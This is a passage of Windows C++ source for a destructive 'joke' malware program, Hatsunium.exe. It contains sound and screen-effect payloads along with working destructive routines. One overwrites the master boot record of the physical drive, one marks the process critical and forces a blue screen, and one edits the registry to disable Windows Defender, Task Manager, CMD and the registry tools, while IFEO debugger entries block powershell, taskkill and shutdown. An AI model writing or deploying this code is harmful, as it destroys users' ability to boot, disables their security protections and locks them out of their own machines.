< 128000) ? (t * 5.592) : 0) + (t * 2) | t >> (t & 1024 ? 3 : 9) & t >> (t & 8192 ? t & 2048 ? 8 : 3 : 1));
	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound12() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1,12800, 12800, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[12800 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((int)((t % 88000 < 4000) ? (t * 12.65) : (t % 88000 < 8000) ? (t * 14.19) : (t % 88000 < 12000) ? (t * 9.47) : (t % 88000 < 16000) ? (t * 8.44) : (t % 88000 < 20000) ? (t * 9.47) : (t % 88000 < 24000) ? (t * 8.44) : (t % 88000 < 28000) ? (t * 12.65) : (t % 88000 < 32000) ? (t * 14.19) : (t % 88000 < 36000) ? (t * 9.47) : (t % 88000 < 40000) ? (t * 8.44) : (t % 88000 < 44000) ? (t * 9.47) : (t % 88000 < 48000) ? (t * 8.44) : (t % 88000 < 52000) ? (t * 12.65) : (t % 88000 < 56000) ? (t * 14.19) : (t % 88000 < 60000) ? (t * 9.47) : (t % 88000 < 64000) ? (t * 8.44) : (t % 88000 < 68000) ? (t * 9.47) : (t % 88000 < 72000) ? (t * 8.44) : (t % 88000 < 76000) ? (t * 11.312) : (t % 88000 < 80000) ? (t * 10.68) : (t % 88000 < 84000) ? (t * 9.512) : (t % 88000 < 88000) ? (t * 8.472) : 0) | t);
	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound13() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1,12500, 12500, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[12500 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((int)((t % 128000 < 2000) ? (t * 4.488) : (t % 128000 < 4000) ? (t * 5.656) : (t % 128000 < 6000) ? (t * 6.728) : (t % 128000 < 10000) ? (t * 7.552) : (t % 128000 < 14000) ? (t * 4.488) : (t % 128000 < 18000) ? (t * 6.728) : (t % 128000 < 22000) ? (t * 4.488) : (t % 128000 < (22000 + (4000 / 3) * 2)) ? (t * 4.24) : (t % 128000 < (22000 + (4000 / 3) * 4)) ? (t * 6.728) : (t % 128000 < 32000) ? (t * 5.656) : (t % 128000 < 34000) ? (t * 4.488) : (t % 128000 < 36000) ? (t * 5.656) : (t % 128000 < 38000) ? (t * 6.728) : (t % 128000 < 42000) ? (t * 7.552) : (t % 128000 < 46000) ? (t * 4.488) : (t % 128000 < 50000) ? (t * 6.728) : (t % 128000 < 54000) ? (t * 4.488) : (t % 128000 < (54000 + (4000 / 3) * 2)) ? (t * 4.24) : (t % 128000 < (54000 + (4000 / 3) * 4)) ? (t * 6.728) : (t % 128000 < 64000) ? (t * 5.656) : (t % 128000 < 66000) ? (t * 8.976) : (t % 128000 < 68000) ? (t * 10.08) : (t % 128000 < 70000) ? (t * 11.312) : (t % 128000 < 74000) ? (t * 22.624) : (t % 128000 < 78000) ? (t * 13.456) : (t % 128000 < 82000) ? (t * 20.184) : (t % 128000 < 86000) ? (t * 13.456) : (t % 128000 < (86000 + (4000 / 3) * 2)) ? (t * 11.312) : (t % 128000 < (86000 + (4000 / 3) * 4)) ? (t * 17.96) : (t % 128000 < 96000) ? (t * 13.456) : (t % 128000 < 98000) ? (t * 4.488) : (t % 128000 < 100000) ? (t * 5.656) : (t % 128000 < 102000) ? (t * 6.728) : (t % 128000 < 106000) ? (t * 7.552) : (t % 128000 < 110000) ? (t * 4.488) : (t % 128000 < 114000) ? (t * 6.728) : (t % 128000 < 118000) ? (t * 4.488) : (t % 128000 < (118000 + (4000 / 3) * 2)) ? (t * 4.232) : (t % 128000 < (118000 + (4000 / 3) * 4)) ? (t * 5.04) : (t % 128000 < 128000) ? (t * 4.488) : 0) | (t & 4096 ? t / 2 * (t ^ t % 256) | t >> 5 : t / 8) | (t & 8192 ? 5 : 8 * t >> t));
	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound14() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1,16384, 16384, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[16384 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((2 * (t + 10 >> (t >> 9 | t >> 14) | t >> 4 - 2)) * ((t >> 10 ^ t + (t >> 6 | 127) >> 10) | 2));
	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound15() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1,15000, 15000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[15000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((int)((t % 55500 < 2500) ? (t * 8.976) : (t % 55500 < 5000) ? (t * 8.976) : (t % 55500 < 7500) ? (t * 10.08) : (t % 55500 < 10000) ? (t * 8.976) : (t % 55500 < 12500) ? (t * 8.976) : (t % 55500 < 15000) ? (t * 10.08) : (t % 55500 < 18000) ? (t * 8.976) : (t % 55500 < 21000) ? (t * 8) : (t % 55500 < 24000) ? (t * 7.552) : (t % 55500 < 27000) ? (t * 6.728) : (t % 55500 < 28500) ? (t * 5.992) : (t % 55500 < 30000) ? (t * 6.728) : (t % 55500 < 31500) ? (t * 5.992) : (t % 55500 < 33000) ? (t * 6.728) : (t % 55500 < 34500) ? (t * 5.992) : (t % 55500 < 36000) ? (t * 6.728) : (t % 55500 < 40000) ? (t * 5.992) : (t % 55500 < 41500) ? (t * 7.552) : (t % 55500 < 43000) ? (t * 8) : (t % 55500 < 44500) ? (t * 7.552) : (t % 55500 < 46000) ? (t * 8) : (t % 55500 < 48500) ? (t * 7.552) : (t % 55500 < 51000) ? (t * 6.728) : (t % 55500 < 55500) ? (t * 5.992) : 0) >> t);
	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound16() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1,18000, 18000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[18000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t << 1 ^ t >> 3 ^ t << 2 | ~t >> 4 & t << 4 & 0 - ~t >> 8);
	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound17() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1,18000, 18000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[18000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((t << 1 ^ t >> 2 ^ t << 3 | ~t >> 4 & ~t << 4 & 0 - t >> 8) - ((t % 128000 < 4000) ? (t * 3.728) : (t % 128000 < 8000) ? (t * 5.592) : (t % 128000 < 12000) ? (t * 3.728) : (t % 128000 < 16000) ? (t * 5.592) : (t % 128000 < 18000) ? (t * 4.986) : (t % 128000 < 20000) ? (t * 5.586) : (t % 128000 < 22000) ? (t * 4.986) : (t % 128000 < 24000) ? (t * 4.436) : (t % 128000 < 28000) ? (t * 4.185) : (t % 128000 < 32000) ? (t * 3.314) : (t % 128000 < 36000) ? (t * 3.728) : (t % 128000 < 40000) ? (t * 5.592) : (t % 128000 < 44000) ? (t * 3.728) : (t % 128000 < 48000) ? (t * 5.592) : (t % 128000 < 50000) ? (t * 4.986) : (t % 128000 < 52000) ? (t * 5.586) : (t % 128000 < 54000) ? (t * 4.986) : (t % 128000 < 56000) ? (t * 4.436) : (t % 128000 < 60000) ? (t * 6.628) : (t % 128000 < 64000) ? (t * 5.592) : (t % 128000 < 68000) ? (t * 3.728) : (t % 128000 < 72000) ? (t * 5.592) : (t % 128000 < 76000) ? (t * 3.728) : (t % 128000 < 80000) ? (t * 5.592) : (t % 128000 < 82000) ? (t * 4.986) : (t % 128000 < 84000) ? (t * 5.586) : (t % 128000 < 86000) ? (t * 4.986) : (t % 128000 < 88000) ? (t * 4.436) : (t % 128000 < 92000) ? (t * 4.185) : (t % 128000 < 96000) ? (t * 3.314) : (t % 128000 < 100000) ? (t * 3) : (t % 128000 < 104000) ? (t * 5.592) : (t % 128000 < 108000) ? (t * 3) : (t % 128000 < 112000) ? (t * 5.592) : (t % 128000 < 114000) ? (t * 4.986) : (t % 128000 < 116000) ? (t * 5.586) : (t % 128000 < 118000) ? (t * 4.986) : (t % 128000 < 120000) ? (t * 4.436) : (t % 128000 < 124000) ? (t * 6.628) : (t % 128000 < 128000) ? (t * 5.592) : 0));
	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound18() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1,8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * (0x0039c5bb >> (t >> 8 & 31)) | t % 39 | t >> 8);
	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound19() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1,8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((t | t >> 8) + (t | ~t >> 5) - (t & t << 4));
	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound20() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1,8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(0x0039c5bb * t + 207944154 ^ t + (1 << ((t >> 11 & (t >> 8) | (t >> 16))) % 20070831));
	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

typedef NTSTATUS(__cdecl* fnRtlSetProcessIsCritical)(IN BOOLEAN NewValue, OUT PBOOLEAN OldValue OPTIONAL, IN BOOLEAN CheckFlag);
fnRtlSetProcessIsCritical pRtlSetProcessIsCritical;
bool EnableDebugPrivilege() {
	HANDLE hToken;
	LUID sedebugnameValue;
	TOKEN_PRIVILEGES tkp;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
		return false;
	}
	if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &sedebugnameValue)) {
		CloseHandle(hToken);
		return false;
	}
	tkp.PrivilegeCount = 1;
	tkp.Privileges[0].Luid = sedebugnameValue;
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	if (!AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof(tkp), NULL, NULL)) {
		CloseHandle(hToken);
		return false;
	}
	return true;
}
void criticalprocess() {
	EnableDebugPrivilege();
	HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
	if (hNtdll) {
		pRtlSetProcessIsCritical = (fnRtlSetProcessIsCritical)GetProcAddress(hNtdll, "RtlSetProcessIsCritical");
		if (pRtlSetProcessIsCritical) {
			pRtlSetProcessIsCritical(TRUE, NULL, FALSE);
		}
	}
}

int killmbr()
{
	BYTE pmbr[512] = { 0 };
	DWORD write;
	HANDLE mbr;
	char mbrdata[mbrsize] = boot;
	memcpy(pmbr, mbrdata, sizeof(mbrdata) - 1);
	pmbr[510] = 0x55;
	pmbr[511] = 0xAA;
	mbr = CreateFile
	(
		"\\\\.\\PHYSICALDRIVE0",
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		0,
		NULL
	);
	if (WriteFile(mbr, pmbr, sizeof(pmbr), &write, NULL) == TRUE)
	{
	}
	else
	{
	}
	CloseHandle(mbr);
	return EXIT_SUCCESS;
}

void changereg() {
	HKEY hkey;
	DWORD value = 1;
	DWORD value2 = 4294967295;
	const char* value3 = "null.exe";
	RegCreateKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", &hkey);
	RegSetValueEx(hkey, "NoClose", NULL, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));
	RegCloseKey(hkey);
	RegCreateKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", &hkey);
	RegSetValueEx(hkey, "NoControlPanel", NULL, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));
	RegCloseKey(hkey);
	RegCreateKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", &hkey);
	RegSetValueEx(hkey, "NoLogOff", NULL, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));
	RegCloseKey(hkey);
	RegCreateKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", &hkey);
	RegSetValueEx(hkey, "NoRun", NULL, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));
	RegCloseKey(hkey);
	RegCreateKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", &hkey);
	RegSetValueEx(hkey, "NoWinKeys", NULL, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));
	RegCloseKey(hkey);
	RegCreateKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", &hkey);
	RegSetValueEx(hkey, "NoDrives", NULL, REG_DWORD, (LPBYTE)&value2, sizeof(DWORD));
	RegCloseKey(hkey);
	RegCreateKey(HKEY_CURRENT_USER, "Software\\Policies\\Microsoft\\Windows\\System", &hkey);
	RegSetValueEx(hkey, "DisableCMD", NULL, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));
	RegCloseKey(hkey);
	RegCreateKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", &hkey);
	RegSetValueEx(hkey, "DisableRegistryTools", NULL, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));
	RegCloseKey(hkey);
	RegCreateKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", &hkey);
	RegSetValueEx(hkey, "DisableTaskMgr", NULL, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));
	RegCloseKey(hkey);
	RegCreateKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", &hkey);
	RegSetValueEx(hkey, "DisableChangePassword", NULL, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));
	RegCloseKey(hkey);
	RegCreateKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", &hkey);
	RegSetValueEx(hkey, "DisableLockWorkstation", NULL, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));
	RegCloseKey(hkey);
	RegCreateKey(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", &hkey);
	RegSetValueEx(hkey, "HideFastUserSwitching", NULL, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));
	RegCloseKey(hkey);
	RegCreateKey(HKEY_LOCAL_MACHINE, "Software\\Policies\\Microsoft\\Windows Defender", &hkey);
	RegSetValueEx(hkey, "DisableAntiSpyware", NULL, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));
	RegCloseKey(hkey);
	RegCreateKey(HKEY_LOCAL_MACHINE, "Software\\Policies\\Microsoft\\Windows Defender", &hkey);
	RegSetValueEx(hkey, "DisableRealtimeMonitoring", NULL, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));
	RegCloseKey(hkey);
	RegCreateKey(HKEY_LOCAL_MACHINE, "Software\\Policies\\Microsoft\\Windows Defender", &hkey);
	RegSetValueEx(hkey, "DisableAntiVirus", NULL, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));
	RegCloseKey(hkey);
	RegCreateKey(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\ntsd.exe", &hkey);
	RegSetValueEx(hkey, "debugger", NULL, REG_SZ, (LPBYTE)&value3, sizeof(value3));
	RegCloseKey(hkey);
	RegCreateKey(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\powershell.exe", &hkey);
	RegSetValueEx(hkey, "debugger", NULL, REG_SZ, (LPBYTE)&value3, sizeof(value3));
	RegCloseKey(hkey);
	RegCreateKey(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\powershell_ise.exe", &hkey);
	RegSetValueEx(hkey, "debugger", NULL, REG_SZ, (LPBYTE)&value3, sizeof(value3));
	RegCloseKey(hkey);
	RegCreateKey(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\reg.exe", &hkey);
	RegSetValueEx(hkey, "debugger", NULL, REG_SZ, (LPBYTE)&value3, sizeof(value3));
	RegCloseKey(hkey);
	RegCreateKey(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\shutdown.exe", &hkey);
	RegSetValueEx(hkey, "debugger", NULL, REG_SZ, (LPBYTE)&value3, sizeof(value3));
	RegCloseKey(hkey);
	RegCreateKey(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\slidetoshutdown.exe", &hkey);
	RegSetValueEx(hkey, "debugger", NULL, REG_SZ, (LPBYTE)&value3, sizeof(value3));
	RegCloseKey(hkey);
	RegCreateKey(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\taskkill.exe", &hkey);
	RegSetValueEx(hkey, "debugger", NULL, REG_SZ, (LPBYTE)&value3, sizeof(value3));
	RegCloseKey(hkey);
	RegCreateKey(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\tasklist.exe", &hkey);
	RegSetValueEx(hkey, "debugger", NULL, REG_SZ, (LPBYTE)&value3, sizeof(value3));
	RegCloseKey(hkey);
}

void bsod() {
	typedef NTSTATUS(NTAPI* pdef_NtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask OPTIONAL, PULONG_PTR Parameters, ULONG ResponseOption, PULONG Response);
	typedef NTSTATUS(NTAPI* pdef_RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);
	BOOLEAN bEnabled;
	ULONG uResp;
	LPVOID lpFuncAddress = GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlAdjustPrivilege");
	LPVOID lpFuncAddress2 = GetProcAddress(GetModuleHandle("ntdll.dll"), "NtRaiseHardError");
	pdef_RtlAdjustPrivilege NtCall = (pdef_RtlAdjustPrivilege)lpFuncAddress;
	pdef_NtRaiseHardError NtCall2 = (pdef_NtRaiseHardError)lpFuncAddress2;
	NTSTATUS NtRet = NtCall(19, TRUE, FALSE, &bEnabled);
	NtCall2(STATUS_FLOAT_MULTIPLE_FAULTS, 0, 0, 0, 6, &uResp);
	ExitProcess(0);
}

LRESULT CALLBACK WndProc(HWND hWnd, UINT msgID, WPARAM wParam, LPARAM lParam)
{
	switch (msgID)
	{
	case WM_DESTROY:
		PostQuitMessage(0);
		break;
	}
	return DefWindowProc(hWnd, msgID, wParam, lParam);
}

int CALLBACK eggwin(_In_ HINSTANCE hIns, _In_opt_ HINSTANCE hPreIns, _In_ LPSTR lpCmdLine, _In_  int nCmdShow)
{
	HDC hdc = GetWindowDC(0);
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);
	int wdpi = GetDeviceCaps(hdc, LOGPIXELSX);
	int hdpi = GetDeviceCaps(hdc, LOGPIXELSY);
	WNDCLASS wc = { 0 };
	wc.cbClsExtra = 0;
	wc.cbWndExtra = 0;
	wc.hbrBackground = (HBRUSH)(CreatePatternBrush(LoadBitmapA(GetModuleHandleA(0), MAKEINTRESOURCE(1))));
	wc.hCursor = NULL;
	wc.hIcon = LoadIconA(GetModuleHandleA(0), MAKEINTRESOURCE(1));
	wc.hInstance = hIns;
	wc.lpfnWndProc = WndProc;
	wc.lpszClassName = "Main";
	wc.lpszMenuName = NULL;
	wc.style = CS_HREDRAW | CS_VREDRAW;
	RegisterClass(&wc);
	HWND cwea = CreateWindowExA(WS_EX_CLIENTEDGE, "Main", "Happy Birthday! Dear Miku!", DS_MODALFRAME | DS_CENTER | WS_POPUP | WS_VISIBLE | WS_CAPTION | WS_SYSMENU, (w - 512) / 2, (h - 288) / 2, 512, 288, NULL, NULL, NULL, NULL);
	ShowWindow(cwea, SW_SHOW);
	UpdateWindow(cwea);
	MSG nMsg = { 0 };
	while (GetMessage(&nMsg, NULL, 0, 0))
	{
		TranslateMessage(&nMsg);
		DispatchMessage(&nMsg);
	}
	return 0;
}

void aboutmsg() {
	MSGBOXPARAMSA MsgBoxParam;
	ZeroMemory(&MsgBoxParam, sizeof(MsgBoxParam));
	MsgBoxParam.cbSize = sizeof(MsgBoxParam);
	MsgBoxParam.hInstance = (HINSTANCE)(GetModuleHandleA(0));
	MsgBoxParam.lpszIcon = MAKEINTRESOURCEA(1);
	MsgBoxParam.dwStyle = MB_OK | MB_USERICON | MB_DEFBUTTON1;
	MsgBoxParam.lpszCaption = "About Hatsunium.exe";
	MsgBoxParam.lpszText = "Hatsunium.exe\r\nVersion 1.0 (Official Version)\r\n\r\nCopyright (C) 2025 XUGE Studios. All rights reserved.\r\n\Hatsunium.exe and its source code are protected. No copying or spreading any parts of or all of source code of this program without allowance!\r\n\r\nTo learn more, please visit \r\nhttps://github.com/AWJDXUGE \r\nhttps://www.youtube.com/@XUGE-k8r \r\nhttps://space.bilibili.com/1741780603 \r\nhttps://www.ixigua.com/home/3074682282049796\r\nOr send email at \r\n1pg_rrowpe00ba@dingtalk.com \r\n2201185373@qq.com";
	MessageBoxIndirectA(&MsgBoxParam);
}

int main() {
	int argc;
	LPWSTR* argv = CommandLineToArgvW(GetCommandLineW(), &argc);
	InitDPI();
	if (argc == 2) {
		if (!lstrcmpW(argv[1], L"/payload1")) {
			sound1();
			HANDLE thread0 = CreateThread(0, 0, movemouse, 0, 0, 0);
			HANDLE thread0plus = CreateThread(0, 0, mousemikucur, 0, 0, 0);
			HANDLE thread1 = CreateThread(0, 0, shader1, 0, 0, 0);
			HANDLE thread2 = CreateThread(0, 0, rgb, 0, 0, 0);
			HANDLE thread3 = CreateThread(0, 0, movescr, 0, 0, 0);
			Sleep(30000);
			TerminateThread(thread1, 0);
			CloseHandle(thread1);
			TerminateThread(thread2, 0);
			CloseHandle(thread2);
			TerminateThread(thread3, 0);
			CloseHandle(thread3);
			refreshscr();
			sound2();
			HANDLE thread4 = CreateThread(0, 0, spiral, 0, 0, 0);
			HANDLE thread5 = CreateThread(0, 0, thirteen, 0, 0, 0);
			Sleep(30000);
			TerminateThread(thread4, 0);
			CloseHandle(thread4);
			TerminateThread(thread5, 0);
			CloseHandle(thread5);
			refreshscr();
			Sleep(540000);
			TerminateThread(thread0, 0);
			CloseHandle(thread0);
			TerminateThread(thread0plus, 0);
			CloseHandle(thread0plus);
			return 0;
		}
		else if (!lstrcmpW(argv[1], L"/payload2")) {
			sound3();
			HANDLE thread6 = CreateThread(0, 0, manyicon, 0, 0, 0);
			HANDLE thread7 = CreateThread(0, 0, shader2, 0, 0, 0);
			Sleep(30000);
			TerminateThread(thread7, 0);
			CloseHandle(thread7);
			refreshscr();
			sound4();
			HANDLE thread8 = CreateThread(0, 0, shader3, 0, 0, 0);
			Sleep(30000);
			TerminateThread(thread8, 0);
			CloseHandle(thread8);
			refreshscr();
			sound5();
			HANDLE thread9 = CreateThread(0, 0, cube, 0, 0, 0);
			HANDLE thread10 = CreateThread(0, 0, shader4, 0, 0, 0);
			Sleep(30000);
			TerminateThread(thread10, 0);
			CloseHandle(thread10);
			refreshscr();
			Sleep(60000);
			TerminateThread(thread6, 0);
			CloseHandle(thread6);
			refreshscr();
			Sleep(390000);
			TerminateThread(thread9, 0);
			CloseHandle(thread9);
			return 0;
		}
		else if (!lstrcmpW(argv[1], L"/payload3")) {
			sound6();
			HANDLE thread11 = CreateThread(0, 0, silie, 0, 0, 0);
			HANDLE thread13 = CreateThread(0, 0, transparent, 0, 0, 0);
			HANDLE thread14 = CreateThread(0, 0, text, 0, 0, 0);
			Sleep(30000);
			TerminateThread(thread11, 0);
			CloseHandle(thread11);
			//TerminateThread(thread12, 0);
			//CloseHandle(thread12);
			refreshscr();
			sound7();
			HANDLE thread15 = CreateThread(0, 0, shader5, 0, 0, 0);
			Sleep(30000);
			TerminateThread(thread13, 0);
			CloseHandle(thread13);
			TerminateThread(thread15, 0);
			CloseHandle(thread15);
			refreshscr();
			sound8();
			HANDLE thread16 = CreateThread(0, 0, shader6, 0, 0, 0);
			HANDLE thread17 = CreateThread(0, 0, gradient, 0, 0, 0);
			Sleep(30000);
			TerminateThread(thread16, 0);
			CloseHandle(thread16);
			refreshscr();
			sound9();
			HANDLE thread18 = CreateThread(0, 0, shader7, 0, 0, 0);
			Sleep(30000);
			TerminateThread(thread18, 0);
			CloseHandle(thread18);
			refreshscr();
			sound10();
			HANDLE thread19 = CreateThread(0, 0, transparent2, 0, 0, 0);
			HANDLE thread20 = CreateThread(0, 0, melt, 0, 0, 0);
			Sleep(30000);
			TerminateThread(thread14, 0);
			CloseHandle(thread14);
			TerminateThread(thread17, 0);
			CloseHandle(thread17);
			TerminateThread(thread20, 0);
			CloseHandle(thread20);
			refreshscr();
			sound11();
